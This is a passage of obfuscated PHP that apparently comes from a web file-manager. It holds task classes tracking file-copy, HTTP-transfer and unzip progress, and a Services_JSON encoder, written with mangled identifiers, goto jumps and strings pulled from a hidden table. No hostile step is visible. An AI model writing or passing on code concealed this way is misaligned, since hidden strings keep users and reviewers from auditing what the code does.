!1; } public function sourceAddFile($c±œ¾ë‰â–) { $Cñœ„ß‘” =& $_SERVER[¿õñ]; $e•…ç†òöÀ =& $this->task; $e•…ç†òöÀ[$Cñœ„ß‘”[1393]] = $c±œ¾ë‰â–[$Cñœ„ß‘”[28]]; $e•…ç†òöÀ[$Cñœ„ß‘”[1295]] = $c±œ¾ë‰â–[$Cñœ„ß‘”[28]]; $this->update(); } public function copyFileStart($dµÍ¦®…˜Ï, $d·óĞƒ’Ô÷, $eÄ—¤Æƒº, $dÉÖİØ‘, $dœ¿ãí¸±, $DÀõÕøùñù) { goto Aœ·â‹ß’¦; Aœ·â‹ß’¦: $F«¼ßóÊ™ğ =& $_SERVER[¿õñ]; $Eó†±ø¸›  = $dœ¿ãí¸±; if ($Eó†±ø¸›  == $GLOBALS[$F«¼ßóÊ™ğ[1403]]) { $Eó†±ø¸›  = $GLOBALS[$F«¼ßóÊ™ğ[1404]]; } goto bÕ’°ùìñƒ; fšñ¯ñ§œ¸: $e´åªœç÷[$F«¼ßóÊ™ğ[1295]] = $F«¼ßóÊ™ğ[33]; $e´åªœç÷[$F«¼ßóÊ™ğ[1397]] = $F«¼ßóÊ™ğ[33]; $e´åªœç÷[$F«¼ßóÊ™ğ[1398]] = 0; goto D”Õ¯Û³„‘; D”Õ¯Û³„‘: $this->update(); goto aóöËà£‹Ï; D²ñÂ©Âè­: $e´åªœç÷[$F«¼ßóÊ™ğ[1393]] = $Eó†±ø¸› ; $e´åªœç÷[$F«¼ßóÊ™ğ[1395]] = (int) $dµÍ¦®…˜Ï->size($d·óĞƒ’Ô÷); $e´åªœç÷[$F«¼ßóÊ™ğ[1396]] = 0; goto fšñ¯ñ§œ¸; bÕ’°ùìñƒ: $GLOBALS[$F«¼ßóÊ™ğ[1404]] = $dœ¿ãí¸±; $GLOBALS[$F«¼ßóÊ™ğ[1403]] = $DÀõÕøùñù; $e´åªœç÷ =& $this->task; goto D²ñÂ©Âè­; aóöËà£‹Ï: } public function copyFileEnd($c¤ùÍ¡â‘†, $eÖÅ‰É¶ƒ¶, $DšÔŸ†‹Ìò, $BéÉê´®÷—, $A±Û˜†ï½ë, $bÕºõ°‹ËÓ) { $CÇ§¯äâºİ =& $_SERVER[¿õñ]; $CÂªÑÈ…Ø =& $this->task; $CÂªÑÈ…Ø[$CÇ§¯äâºİ[1396]] = $CÂªÑÈ…Ø[$CÇ§¯äâºİ[1395]]; $CÂªÑÈ…Ø[$CÇ§¯äâºİ[1397]] = $CÇ§¯äâºİ[33]; if ($A±Û˜†ï½ë == $CÂªÑÈ…Ø[$CÇ§¯äâºİ[1393]]) { $CÂªÑÈ…Ø[$CÇ§¯äâºİ[1400]] += $CÂªÑÈ…Ø[$CÇ§¯äâºİ[1395]]; $this->update(1); } else { $this->update(); $CÂªÑÈ…Ø[$CÇ§¯äâºİ[1396]] = 0; } self::log($CÇ§¯äâºİ[1405] . $eÖÅ‰É¶ƒ¶ . $CÇ§¯äâºİ[67] . $BéÉê´®÷— . $CÇ§¯äâºİ[214] . $A±Û˜†ï½ë . $CÇ§¯äâºİ[1406] . $CÂªÑÈ…Ø[$CÇ§¯äâºİ[1393]]); } public function updateFileEnd($CÎî¼Ã³®é, $f»¼İòŒŒ†) { $eÙ•»‘…‚ =& $_SERVER[¿õñ]; $dŒ»ƒ÷…Ó¾ =& $this->task; $dŒ»ƒ÷…Ó¾[$eÙ•»‘…‚[1393]] = $CÎî¼Ã³®é; $dŒ»ƒ÷…Ó¾[$eÙ•»‘…‚[1395]] = $f»¼İòŒŒ†; $dŒ»ƒ÷…Ó¾[$eÙ•»‘…‚[1400]] += $f»¼İòŒŒ†; $this->update(1); } public function sourceModelCopy($a²›â²‘·ï) { goto C¡´„ÓŒäÖ; C¡´„ÓŒäÖ: $a¹‰×øÊœ¼ =& $_SERVER[¿õñ]; $F½èİÒ‹‚ = $a²›â²‘·ï[0]; $D¦‘ÌË® = $a²›â²‘·ï[1]; goto C¬¶õ†‡¹; A¦ñÀ¦áÊœ: switch ($F½èİÒ‹‚) { case $a¹‰×øÊœ¼[500]: $aÒµ¨©ÖÛ = 1; break; case $a¹‰×øÊœ¼[503]: $Eµƒ÷¶£‘Á[$a¹‰×øÊœ¼[1393]] = $D¦‘ÌË®[$a¹‰×øÊœ¼[28]]; break; case $a¹‰×øÊœ¼[505]: $aÒµ¨©ÖÛ = intval($a²›â²‘·ï[$a¹‰×øÊœ¼[360]] * 0.4); break; case $a¹‰×øÊœ¼[507]: $aÒµ¨©ÖÛ = intval($a²›â²‘·ï[$a¹‰×øÊœ¼[360]] * 0.2); break; case $a¹‰×øÊœ¼[509]: $aÒµ¨©ÖÛ = intval($a²›â²‘·ï[$a¹‰×øÊœ¼[360]] * 0.4); break; } $this->update($aÒµ¨©ÖÛ); $this->sourceModelCopyFlag = !1; goto c¶Æ±³’¶İ; C¬¶õ†‡¹: $Eµƒ÷¶£‘Á =& $this->task; $this->sourceModelCopyFlag = !0; $aÒµ¨©ÖÛ = 0; goto A¦ñÀ¦áÊœ; c¶Æ±³’¶İ: } public function sourceRemove($B—·²Œˆòä, $E­“ÏØ¿çñ) { $a°‚«„Ê =& $_SERVER[¿õñ]; $this->sourceModelCopyFlag = !0; $aóÈËİóİ“ = 1; if (isset($B—·²Œˆòä[$a°‚«„Ê[81]])) { $aóÈËİóİ“ = $B—·²Œˆòä[$a°‚«„Ê[81]][$a°‚«„Ê[79]] + $B—·²Œˆòä[$a°‚«„Ê[81]][$a°‚«„Ê[80]] + 1; } $this->update($aóÈËİóİ“); $this->sourceModelCopyFlag = !1; } public function sourceMove($e†‹’¨¨½æ) { $this->sourceRemove($e†‹’¨¨½æ, !1); } public function curlProgress($b‹ƒ—ÕÍ¤ô, $fµï‚´Ñ¦, $Bòƒ–çƒ‰É, $Fìà•Ø„¶Ú, $eÌ¾†ª…â­) { $F¨·Ø¿­ò® =& $_SERVER[¿õñ]; $C˜‚öŞ¶É¨ =& $this->task; if ($eÌ¾†ª…â­ > 0) { $C˜‚öŞ¶É¨[$F¨·Ø¿­ò®[1295]] = $F¨·Ø¿­ò®[1407]; $C˜‚öŞ¶É¨[$F¨·Ø¿­ò®[1397]] = $F¨·Ø¿­ò®[90]; if ($C˜‚öŞ¶É¨[$F¨·Ø¿­ò®[1395]] == $Fìà•Ø„¶Ú || $Fìà•Ø„¶Ú > 1024 * 1024) { $C˜‚öŞ¶É¨[$F¨·Ø¿­ò®[1396]] = $eÌ¾†ª…â­; } if ($C˜‚öŞ¶É¨[$F¨·Ø¿­ò®[1398]]) { $C˜‚öŞ¶É¨[$F¨·Ø¿­ò®[1396]] = $eÌ¾†ª…â­ + $C˜‚öŞ¶É¨[$F¨·Ø¿­ò®[1398]]; } } else { if ($Bòƒ–çƒ‰É > 0) { if ($C˜‚öŞ¶É¨[$F¨·Ø¿­ò®[1395]] == $fµï‚´Ñ¦) { $C˜‚öŞ¶É¨[$F¨·Ø¿­ò®[1396]] = $Bòƒ–çƒ‰É; $C˜‚öŞ¶É¨[$F¨·Ø¿­ò®[1295]] = $F¨·Ø¿­ò®[1408]; $C˜‚öŞ¶É¨[$F¨·Ø¿­ò®[1397]] = $F¨·Ø¿­ò®[1025]; } } } $this->update(); } public function curlProgressStart($Eœ‰Ø©¢¸÷) { } public function curlProgressEnd($fÌ‹Èä…½¶) { $F…¹‡¹’ŸÖ =& $_SERVER[¿õñ]; $f¨æ‹Œ—Ì™ =& $this->task; $fƒ ëã°©á = curl_getinfo($fÌ‹Èä…½¶); $EÈ×â“ºŠ¨ = $fƒ ëã°©á[$F…¹‡¹’ŸÖ[1409]]; if ($f¨æ‹Œ—Ì™[$F…¹‡¹’ŸÖ[1397]] == $F…¹‡¹’ŸÖ[90] && $EÈ×â“ºŠ¨) { $f¨æ‹Œ—Ì™[$F…¹‡¹’ŸÖ[1398]] += $EÈ×â“ºŠ¨; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $CÁ²­í¡ï =& $_SERVER[¿õñ]; Hook::bind($CÁ²­í¡ï[1387], array($this, $CÁ²­í¡ï[1410])); Hook::bind($CÁ²­í¡ï[1389], array($this, $CÁ²­í¡ï[1411])); Hook::bind($CÁ²­í¡ï[1391], array($this, $CÁ²­í¡ï[1412])); } protected function endAfter() { $aˆáÂ°˜ˆº =& $_SERVER[¿õñ]; Hook::unbind($aˆáÂ°˜ˆº[1387], array($this, $aˆáÂ°˜ˆº[1410])); Hook::unbind($aˆáÂ°˜ˆº[1389], array($this, $aˆáÂ°˜ˆº[1411])); Hook::unbind($aˆáÂ°˜ˆº[1391], array($this, $aˆáÂ°˜ˆº[1412])); } public function progressStart($F„ƒÊ®£ù¡) { $Cõõ¸¦‘§› =& $_SERVER[¿õñ]; $dø‡…ŒßŞ¸ = curl_getinfo($F„ƒÊ®£ù¡); self::log($Cõõ¸¦‘§›[1413] . $dø‡…ŒßŞ¸[$Cõõ¸¦‘§›[292]]); self::valueSet($this->task[$Cõõ¸¦‘§›[364]], $this->task); } public function progressEnd($e’¨ ‘Ë‡‹) { $eØ¢ÊØö“ =& $_SERVER[¿õñ]; self::log($eØ¢ÊØö“[1414] . $this->task[$eØ¢ÊØö“[364]]); $this->end(); } public function progress($F‡ñĞÔ¯Áâ, $Dïî—ø…”´, $dÙ² Ü†ù, $bË¨”šãˆ, $F§Œ“Æç¼Å) { $e©àÖÁè†Ğ =& $_SERVER[¿õñ]; $A†…²¬°Öµ =& $this->task; if ($F§Œ“Æç¼Å > 0) { $A†…²¬°Öµ[$e©àÖÁè†Ğ[1293]] = $A†…²¬°Öµ[$e©àÖÁè†Ğ[1293]] == 0 ? $bË¨”šãˆ : $A†…²¬°Öµ[$e©àÖÁè†Ğ[1293]]; $A†…²¬°Öµ[$e©àÖÁè†Ğ[1298]] = $F§Œ“Æç¼Å; } else { if ($dÙ² Ü†ù > 0) { $A†…²¬°Öµ[$e©àÖÁè†Ğ[1293]] = $A†…²¬°Öµ[$e©àÖÁè†Ğ[1293]] == 0 ? $Dïî—ø…”´ : $A†…²¬°Öµ[$e©àÖÁè†Ğ[1293]]; $A†…²¬°Öµ[$e©àÖÁè†Ğ[1298]] = $dÙ² Ü†ù; } } $this->update(); self::log("\x70\x72\157\147\162\145\163\x73\110\164\x74\160\x3a\x64\157\167\x6e\72{$dÙ² Ü†ù}\x2f{$Dïî—ø…”´}\x3b\x20\165\x70\x6c\157\x61\x64\x3a{$F§Œ“Æç¼Å}\x2f{$bË¨”šãˆ}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto eƒ³‡İ´š±; eƒ³‡İ´š±: $EÄÌöä‰ÇŠ =& $_SERVER[¿õñ]; parent::startAfter(); Hook::bind($EÄÌöä‰ÇŠ[1415], array($this, $EÄÌöä‰ÇŠ[1416])); goto D˜ŞÔÉ†÷â; aª¬ğ˜Ö—†: if (!$B°ºá®Ï±²[$EÄÌöä‰ÇŠ[1247]]) { $B°ºá®Ï±²[$EÄÌöä‰ÇŠ[1247]] = LNG($EÄÌöä‰ÇŠ[1419]); } goto aê‡Úó‡ò•; D˜ŞÔÉ†÷â: Hook::bind($EÄÌöä‰ÇŠ[1020], array($this, $EÄÌöä‰ÇŠ[1417])); $B°ºá®Ï±² =& $this->task; $B°ºá®Ï±²[$EÄÌöä‰ÇŠ[1418]] = $EÄÌöä‰ÇŠ[1025]; goto aª¬ğ˜Ö—†; aê‡Úó‡ò•: } protected function endAfter() { $aõà¯óáù =& $_SERVER[¿õñ]; parent::endAfter(); Hook::unbind($aõà¯óáù[1415], array($this, $aõà¯óáù[1416])); Hook::unbind($aõà¯óáù[1020], array($this, $aõà¯óáù[1417])); } public function updateAfter() { $fÔ—òœ§õã =& $_SERVER[¿õñ]; $e¨í‡’ =& $this->task; if (!$e¨í‡’[$fÔ—òœ§õã[1293]] || !$e¨í‡’[$fÔ—òœ§õã[695]]) { return; } if ($e¨í‡’[$fÔ—òœ§õã[1418]] == $fÔ—òœ§õã[1025]) { $FÒÏ÷É‡Ë· = 0; if ($e¨í‡’[$fÔ—òœ§õã[1395]]) { $FÒÏ÷É‡Ë· = $e¨í‡’[$fÔ—òœ§õã[1396]] / $e¨í‡’[$fÔ—òœ§õã[1395]]; } $e¨í‡’[$fÔ—òœ§õã[1351]] = $FÒÏ÷É‡Ë· * 0.3; } else { if ($e¨í‡’[$fÔ—òœ§õã[1418]] == $fÔ—òœ§õã[298]) { $FÒÏ÷É‡Ë· = $e¨í‡’[$fÔ—òœ§õã[1298]] / $e¨í‡’[$fÔ—òœ§õã[1293]]; $e¨í‡’[$fÔ—òœ§õã[1351]] = 0.3 + $FÒÏ÷É‡Ë· * 0.4; } else { if ($e¨í‡’[$fÔ—òœ§õã[1418]] == $fÔ—òœ§õã[90]) { $f™¶ôĞÉœ„ = 0; if ($e¨í‡’[$fÔ—òœ§õã[1397]] == $fÔ—òœ§õã[90]) { $f™¶ôĞÉœ„ = $e¨í‡’[$fÔ—òœ§õã[1396]]; } $FÒÏ÷É‡Ë· = ($e¨í‡’[$fÔ—òœ§õã[1400]] + $f™¶ôĞÉœ„) / $e¨í‡’[$fÔ—òœ§õã[695]]; $e¨í‡’[$fÔ—òœ§õã[1351]] = 0.3 + 0.4 + $FÒÏ÷É‡Ë· * 0.3; } } } if ($e¨í‡’[$fÔ—òœ§õã[1351]] > 0) { $eŠïãåòğÙ = timeFloat() - $e¨í‡’[$fÔ—òœ§õã[1353]] - $e¨í‡’[$fÔ—òœ§õã[1356]]; $e¨í‡’[$fÔ—òœ§õã[1357]] = $eŠïãåòğÙ * (1 - $e¨í‡’[$fÔ—òœ§õã[1351]]) / $e¨í‡’[$fÔ—òœ§õã[1351]]; } } public function addFile($D™İ·İ¢†) { goto EŒÃ÷‰ìŸª; EŒÃ÷‰ìŸª: $a©ñòÖ…âÑ =& $_SERVER[¿õñ]; $Aãò’ğ®³‡ =& $this->task; $fÊİƒ‚àÛ‚ = IO::info($D™İ·İ¢†); goto FˆÀ“„íã…; CòÜä“†í•: $this->update(); goto a‰‹ÅŞª×­; FˆÀ“„íã…: $Aãò’ğ®³‡[$a©ñòÖ…âÑ[1393]] = $fÊİƒ‚àÛ‚[$a©ñòÖ…âÑ[28]]; $Aãò’ğ®³‡[$a©ñòÖ…âÑ[1395]] = $fÊİƒ‚àÛ‚[$a©ñòÖ…âÑ[78]]; $Aãò’ğ®³‡[$a©ñòÖ…âÑ[1396]] = 0; goto e¶Û­§¨ïõ; FÅÙæÔÔ«ó: $Aãò’ğ®³‡[$a©ñòÖ…âÑ[1293]] = 1; $F¦«”’®Ç‰ = 0; $Aãò’ğ®³‡[$a©ñòÖ…âÑ[1401]] = array($a©ñòÖ…âÑ[1402] => $F¦«”’®Ç‰ + 1, $a©ñòÖ…âÑ[383] => $fÊİƒ‚àÛ‚[$a©ñòÖ…âÑ[28]], $a©ñòÖ…âÑ[76] => $fÊİƒ‚àÛ‚[$a©ñòÖ…âÑ[76]], $a©ñòÖ…âÑ[462] => $fÊİƒ‚àÛ‚[$a©ñòÖ…âÑ[462]] ? $fÊİƒ‚àÛ‚[$a©ñòÖ…âÑ[462]] : $fÊİƒ‚àÛ‚[$a©ñòÖ…âÑ[76]]); goto CòÜä“†í•; e¶Û­§¨ïõ: $Aãò’ğ®³‡[$a©ñòÖ…âÑ[1295]] = $a©ñòÖ…âÑ[1408]; $Aãò’ğ®³‡[$a©ñòÖ…âÑ[1397]] = $a©ñòÖ…âÑ[1025]; $Aãò’ğ®³‡[$a©ñòÖ…âÑ[695]] = $fÊİƒ‚àÛ‚[$a©ñòÖ…âÑ[78]]; goto FÅÙæÔÔ«ó; a‰‹ÅŞª×­: } public function unzipAfter($aÀÇ Ãâø²) { goto A‰¯‚‡ò†•; AÓ™­º‰Ô“: $e”„Ç‰¯òĞ[$A¦œà”È„Õ[1393]] = $A¦œà”È„Õ[33]; $e”„Ç‰¯òĞ[$A¦œà”È„Õ[1400]] = 0; $e”„Ç‰¯òĞ[$A¦œà”È„Õ[695]] = $f×’Ñ† [$A¦œà”È„Õ[78]]; goto B™®Ø‡Å ; DŞ¨ÕÊÄÇ›: if ($f×’Ñ† [$A¦œà”È„Õ[29]] == $A¦œà”È„Õ[164]) { $e”„Ç‰¯òĞ[$A¦œà”È„Õ[1293]] = 1; } else { $e”„Ç‰¯òĞ[$A¦œà”È„Õ[1293]] = $f×’Ñ† [$A¦œà”È„Õ[81]][$A¦œà”È„Õ[79]]; } $e”„Ç‰¯òĞ[$A¦œà”È„Õ[1295]] = $A¦œà”È„Õ[33]; $e”„Ç‰¯òĞ[$A¦œà”È„Õ[1397]] = 0; goto fÑÏç›ÓÚ¹; B™®Ø‡Å : $this->update(); self::log($A¦œà”È„Õ[1420] . json_encode(array($e”„Ç‰¯òĞ, $f×’Ñ† ))); goto B”˜‡‡¸ˆ; fÑÏç›ÓÚ¹: $e”„Ç‰¯òĞ[$A¦œà”È„Õ[1298]] = 0; $e”„Ç‰¯òĞ[$A¦œà”È„Õ[1395]] = 0; $e”„Ç‰¯òĞ[$A¦œà”È„Õ[1396]] = 0; goto AÓ™­º‰Ô“; A‰¯‚‡ò†•: $A¦œà”È„Õ =& $_SERVER[¿õñ]; $e”„Ç‰¯òĞ =& $this->task; $e”„Ç‰¯òĞ[$A¦œà”È„Õ[1418]] = $A¦œà”È„Õ[90]; goto F®©‰—İ—ë; F®©‰—İ—ë: $f×’Ñ†  = IO::infoWithChildren($aÀÇ Ãâø²); $dŸŒ˜ùºï® = 0; $e”„Ç‰¯òĞ[$A¦œà”È„Õ[1401]] = array($A¦œà”È„Õ[1402] => $dŸŒ˜ùºï® + 1, $A¦œà”È„Õ[383] => $f×’Ñ† [$A¦œà”È„Õ[28]], $A¦œà”È„Õ[76] => $f×’Ñ† [$A¦œà”È„Õ[76]], $A¦œà”È„Õ[462] => $f×’Ñ† [$A¦œà”È„Õ[462]] ? $f×’Ñ† [$A¦œà”È„Õ[462]] : $f×’Ñ† [$A¦œà”È„Õ[76]]); goto DŞ¨ÕÊÄÇ›; B”˜‡‡¸ˆ: } public function nameParse($C÷ƒŠµˆˆ¸) { goto D’¾‹Å·‡¯; c¤Ô§Ä“¶: $CœšÕ“¬¥ = get_path_this($C÷ƒŠµˆˆ¸); if (strstr($CœšÕ“¬¥, $bƒÖËê[92])) { $d±öĞ†øèø[$bƒÖËê[1298]] += 1; $d±öĞ†øèø[$bƒÖËê[1293]] += 1; } $d±öĞ†øèø[$bƒÖËê[1393]] = $C÷ƒŠµˆˆ¸; goto bñ¡á™½ªŒ; D’¾‹Å·‡¯: $bƒÖËê =& $_SERVER[¿õñ]; $d±öĞ†øèø =& $this->task; if ($d±öĞ†øèø[$bƒÖËê[1418]] == $bƒÖËê[1025]) { $d±öĞ†øèø[$bƒÖËê[1418]] = $bƒÖËê[298]; $d±öĞ†øèø[$bƒÖËê[1400]] = 0; $d±öĞ†øèø[$bƒÖËê[695]] = 0; } goto c¤Ô§Ä“¶; bñ¡á™½ªŒ: $this->update(); goto E÷ÌÀÄ¤¤¤; E÷ÌÀÄ¤¤¤: } } goto b÷™—é‡Í; CÀƒêÍë‰†: define($_SERVER[¿õñ][1847], 16); define($_SERVER[¿õñ][1848], 32); class Services_JSON { function __construct($EÓ£î×‚ö = 0) { $this->use = $EÓ£î×‚ö; } function utf162utf8($a´åò¾õî) { $aÌÕÙ‡± =& $_SERVER[¿õñ]; if (function_exists($aÌÕÙ‡±[69])) { return mb_convert_encoding($a´åò¾õî, $aÌÕÙ‡±[1498], $aÌÕÙ‡±[1849]); } $e×œàÜ™¿† = ord($a´åò¾õî[0]) << 8 | ord($a´åò¾õî[1]); switch (!0) { case (127 & $e×œàÜ™¿†) == $e×œàÜ™¿†: return chr(127 & $e×œàÜ™¿†); case (2047 & $e×œàÜ™¿†) == $e×œàÜ™¿†: return chr(192 | $e×œàÜ™¿† >> 6 & 31) . chr(128 | $e×œàÜ™¿† & 63); case (65535 & $e×œàÜ™¿†) == $e×œàÜ™¿†: return chr(224 | $e×œàÜ™¿† >> 12 & 15) . chr(128 | $e×œàÜ™¿† >> 6 & 63) . chr(128 | $e×œàÜ™¿† & 63); } return $aÌÕÙ‡±[33]; } function utf82utf16($B²‚ËÃ²á) { $bÖêïİäÁ =& $_SERVER[¿õñ]; if (function_exists($bÖêïİäÁ[69])) { return mb_convert_encoding($B²‚ËÃ²á, $bÖêïİäÁ[1849], $bÖêïİäÁ[1498]); } switch (strlen($B²‚ËÃ²á)) { case 1: return $B²‚ËÃ²á; case 2: return chr(7 & ord($B²‚ËÃ²á[0]) >> 2) . chr(192 & ord($B²‚ËÃ²á[0]) << 6 | 63 & ord($B²‚ËÃ²á[1])); case 3: return chr(240 & ord($B²‚ËÃ²á[0]) << 4 | 15 & ord($B²‚ËÃ²á[1]) >> 2) . chr(192 & ord($B²‚ËÃ²á[1]) << 6 | 127 & ord($B²‚ËÃ²á[2])); } return $bÖêïİäÁ[33]; } function encode($fäîÛ·á‡) { $fâ÷ù¸ƒ‚ƒ =& $_SERVER[¿õñ]; switch (gettype($fäîÛ·á‡)) { case $fâ÷ù¸ƒ‚ƒ[1509]: return $fäîÛ·á‡ ? $fâ÷ù¸ƒ‚ƒ[1508] : $fâ÷ù¸ƒ‚ƒ[1510]; case $fâ÷ù¸ƒ‚ƒ[1850]: return $fâ÷ù¸ƒ‚ƒ[100]; case $fâ÷ù¸ƒ‚ƒ[300]: return (int) $fäîÛ·á‡; case $fâ÷ù¸ƒ‚ƒ[275]: case $fâ÷ù¸ƒ‚ƒ[274]: return (double) $fäîÛ·á‡; case $fâ÷ù¸ƒ‚ƒ[309]: $D°Şò…ªÓ‚ = $fâ÷ù¸ƒ‚ƒ[33]; $fÇ‘è–Ùô¦ = strlen($fäîÛ·á‡); for ($eˆÚëïÕÚè = 0; $eˆÚëïÕÚè < $fÇ‘è–Ùô¦; ++$eˆÚëïÕÚè) { $b¼ŞÑ…ôòÜ = ord($fäîÛ·á‡[$eˆÚëïÕÚè]); switch (!0) { case $b¼ŞÑ…ôòÜ == 8: $D°Şò…ªÓ‚ .= $fâ÷ù¸ƒ‚ƒ[1851]; break; case $b¼ŞÑ…ôòÜ == 9: $D°Şò…ªÓ‚ .= $fâ÷ù¸ƒ‚ƒ[1485]; break; case $b¼ŞÑ…ôòÜ == 10: $D°Şò…ªÓ‚ .= $fâ÷ù¸ƒ‚ƒ[1483]; break; case $b¼ŞÑ…ôòÜ == 12: $D°Şò…ªÓ‚ .= $fâ÷ù¸ƒ‚ƒ[1852]; break; case $b¼ŞÑ…ôòÜ == 13: $D°Şò…ªÓ‚ .= $fâ÷ù¸ƒ‚ƒ[1484]; break; case $b¼ŞÑ…ôòÜ == 34: case $b¼ŞÑ…ôòÜ == 47: case $b¼ŞÑ…ôòÜ == 92: $D°Şò…ªÓ‚ .= $fâ÷ù¸ƒ‚ƒ[94] . $fäîÛ·á‡[$eˆÚëïÕÚè]; break; case $b¼ŞÑ…ôòÜ >= 32 && $b¼ŞÑ…ôòÜ <= 127: $D°Şò…ªÓ‚ .= $fäîÛ·á‡[$eˆÚëïÕÚè]; break; case ($b¼ŞÑ…ôòÜ & 224) == 192: $dÓ²ˆÍ‹›ƒ = pack($fâ÷ù¸ƒ‚ƒ[1853], $b¼ŞÑ…ôòÜ, ord($fäîÛ·á‡[$eˆÚëïÕÚè + 1])); $eˆÚëïÕÚè += 1; $Eƒ§²çôí = $this->utf82utf16($dÓ²ˆÍ‹›ƒ); $D°Şò…ªÓ‚ .= sprintf($fâ÷ù¸ƒ‚ƒ[1854], bin2hex($Eƒ§²çôí)); break; case ($b¼ŞÑ…ôòÜ & 240) == 224: $dÓ²ˆÍ‹›ƒ = pack($fâ÷ù¸ƒ‚ƒ[1853], $b¼ŞÑ…ôòÜ, ord($fäîÛ·á‡[$eˆÚëïÕÚè + 1]), ord($fäîÛ·á‡[$eˆÚëïÕÚè + 2])); $eˆÚëïÕÚè += 2; $Eƒ§²çôí = $this->utf82utf16($dÓ²ˆÍ‹›ƒ); $D°Şò…ªÓ‚ .= sprintf($fâ÷ù¸ƒ‚ƒ[1854], bin2hex($Eƒ§²çôí)); break; case ($b¼ŞÑ…ôòÜ & 248) == 240: $dÓ²ˆÍ‹›ƒ = pack($fâ÷ù¸ƒ‚ƒ[1853], $b¼ŞÑ…ôòÜ, ord($fäîÛ·á‡[$eˆÚëïÕÚè + 1]), ord($fäîÛ·á‡[$eˆÚëïÕÚè + 2]), ord($fäîÛ·á‡[$eˆÚëïÕÚè + 3])); $eˆÚëïÕÚè += 3; $Eƒ§²çôí = $this->utf82utf16($dÓ²ˆÍ‹›ƒ); $D°Şò…ªÓ‚ .= sprintf($fâ÷ù¸ƒ‚ƒ[1854], bin2hex($Eƒ§²çôí)); break; case ($b¼ŞÑ…ôòÜ & 252) == 248: $dÓ²ˆÍ‹›ƒ = pack($fâ÷ù¸ƒ‚ƒ[1853], $b¼ŞÑ…ôòÜ, ord($fäîÛ·á‡[$eˆÚëïÕÚè + 1]), ord($fäîÛ·á‡[$eˆÚëïÕÚè + 2]), ord($fäîÛ·á‡[$eˆÚëïÕÚè + 3]), ord($fäîÛ·á‡[$eˆÚëïÕÚè + 4])); $eˆÚëïÕÚè += 4; $Eƒ§²çôí = $this->utf82utf16($dÓ²ˆÍ‹›ƒ); $D°Şò…ªÓ‚ .= sprintf($fâ÷ù¸ƒ‚ƒ[1854], bin2hex($Eƒ§²çôí)); break; case ($b¼ŞÑ…ôòÜ & 254) == 252: $dÓ²ˆÍ‹›ƒ = pack($fâ÷ù¸ƒ‚ƒ[1853], $b¼ŞÑ…ôòÜ, ord($fäîÛ·á‡[$eˆÚëïÕÚè + 1]), ord($fäîÛ·á‡[$eˆÚëïÕÚè + 2]), ord($fäîÛ·á‡[$eˆÚëïÕÚè + 3]), ord($fäîÛ·á‡[$eˆÚëïÕÚè + 4]), ord($fäîÛ·á‡[$eˆÚëïÕÚè + 5])); $eˆÚëïÕÚè += 5; $Eƒ§²çôí = $this->utf82utf16($dÓ²ˆÍ‹›ƒ); $D°Şò…ªÓ‚ .= sprintf($fâ÷ù¸ƒ‚ƒ[1854], bin2hex($Eƒ§²çôí)); break; } } return $fâ÷ù¸ƒ‚ƒ[112] . $D°Şò…ªÓ‚ . $fâ÷ù¸ƒ‚ƒ[112]; case $fâ÷ù¸ƒ‚ƒ[1855]: if (is_array($fäîÛ·á‡) && count($fäîÛ·á‡) && array_keys($fäîÛ·á‡) !== range(0, sizeof($fäîÛ·á‡) - 1)) { $f‚µÊÙàå = array_map(array($this, $fâ÷ù¸ƒ‚ƒ[1856]), array_keys($fäîÛ·á‡), array_values($fäîÛ·á‡)); foreach ($f‚µÊÙàå as $BØö¾Åñ£Í) { if (Services_JSON::isError($BØö¾Åñ£Í)) { return $BØö¾Åñ£Í; } } return $fâ÷ù¸ƒ‚ƒ[1049] . join($fâ÷ù¸ƒ‚ƒ[47], $f‚µÊÙàå) . $fâ÷ù¸ƒ‚ƒ[312]; } $d»©¼¤¹ëØ = array_map(array($this, $fâ÷ù¸ƒ‚ƒ[1857]), $fäîÛ·á‡); foreach ($d»©¼¤¹ëØ as $E¨´ä‚–®) { if (Services_JSON::isError($E¨´ä‚–®)) { return $E¨´ä‚–®; } } return $fâ÷ù¸ƒ‚ƒ[154] . join($fâ÷ù¸ƒ‚ƒ[47], $d»©¼¤¹ëØ) . $fâ÷ù¸ƒ‚ƒ[468]; case $fâ÷ù¸ƒ‚ƒ[1858]: $A†Ü¾ñØ˜ = get_object_vars($fäîÛ·á‡); $f‚µÊÙàå = array_map(array($this, $fâ÷ù¸ƒ‚ƒ[1856]), array_keys($A†Ü¾ñØ˜), array_values($A†Ü¾ñØ˜)); foreach ($f‚µÊÙàå as $BØö¾Åñ£Í) { if (Services_JSON::isError($BØö¾Åñ£Í)) { return $BØö¾Åñ£Í; } } return $fâ÷ù¸ƒ‚ƒ[1049] . join($fâ÷ù¸ƒ‚ƒ[47], $f‚µÊÙàå) . $fâ÷ù¸ƒ‚ƒ[312]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $fâ÷ù¸ƒ‚ƒ[100] : new Services_JSON_Error(gettype($fäîÛ·á‡) . $fâ÷ù¸ƒ‚ƒ[1859]); } } function name_value($AËÒ•î±Ä, $E™’“Æô®Û) { $DŒ¯‚éâ± = $this->encode($E™’“Æô®Û); if (Services_JSON::isError($DŒ¯‚éâ±)) { return $DŒ¯‚éâ±; } return $this->encode(strval($AËÒ•î±Ä)) . $_SERVER[¿õñ][4] . $DŒ¯‚éâ±; } function reduce_string($bæÅˆÍ‰) { $eî¶œ˜¨ê =& $_SERVER[¿õñ]; $bæÅˆÍ‰ = preg_replace(array($eî¶œ˜¨ê[1860], $eî¶œ˜¨ê[1861], $eî¶œ˜¨ê[1862]), $eî¶œ˜¨ê[33], $bæÅˆÍ‰); return trim($bæÅˆÍ‰); } function decode($DÄ™òª¿ ) { $BÂÈí®ŠßŠ =& $_SERVER[¿õñ]; $DÄ™òª¿  = $this->reduce_string($DÄ™òª¿ ); switch (strtolower($DÄ™òª¿ )) { case $BÂÈí®ŠßŠ[1508]: return !0; case $BÂÈí®ŠßŠ[1510]: return !1; case $BÂÈí®ŠßŠ[100]: return null; default: $B’®²Îäõî = array(); if (is_numeric($DÄ™òª¿ )) { return (double) $DÄ™òª¿  == (int) $DÄ™òª¿  ? (int) $DÄ™òª¿  : (double) $DÄ™òª¿ ; } elseif (preg_match($BÂÈí®ŠßŠ[1863], $DÄ™òª¿ , $B’®²Îäõî) && $B’®²Îäõî[1] == $B’®²Îäõî[2]) { $C‰ÛÚ¦å÷Š = substr($DÄ™òª¿ , 0, 1); 